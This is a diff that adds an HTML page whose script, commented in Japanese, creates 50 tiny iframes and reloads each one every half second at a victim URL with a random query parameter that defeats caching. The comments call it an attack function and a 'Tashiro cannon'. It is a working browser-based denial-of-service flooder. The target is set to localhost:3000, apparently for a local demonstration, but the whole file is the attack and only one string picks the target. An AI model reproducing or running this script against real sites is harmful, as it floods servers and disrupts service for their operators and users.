@@ -1,0 +1,35 @@
+<html>
+
+<body>
+  <div id="iframe-container"></div>
+  <script>
+    // iframe要素を50個生成する
+    const numberOfIframe = 50;
+    const iframeContainer = document.getElementById("iframe-container");
+    for (let i = 0; i < numberOfIframe; i++) {
+      const iframeElement = document.createElement("iframe");
+      iframeElement.width = 10;
+      iframeElement.height = 10;
+      iframeElement.name = "iframe-to-attack";
+      iframeContainer.append(iframeElement);
+    }
+    const iframeElements = document.getElementsByName("iframe-to-attack");
+    /**
+     * 攻撃用の関数
+     * 1回の攻撃で上で生成したiframe要素の数だけリクエストを生成する
+     */
+    function attack() {
+      for (let iframeElement of iframeElements) {
+        // 田代砲の被害に遭うURL
+        const victim = "http://localhost:3000";
+        // ブラウザのキャッシュ機能を無効化するためにダミーのクエリパラメータを付与する
+        iframeElement.contentWindow.location.href = `${victim}?dummy_param=${Math.random()}`;
+      }
+    }
+    // 0.5秒に1回攻撃する
+    const attackInterval = 0.5 * 1000;
+    setInterval(attack, attackInterval);
+  </script>
+</body>
+
+</html>
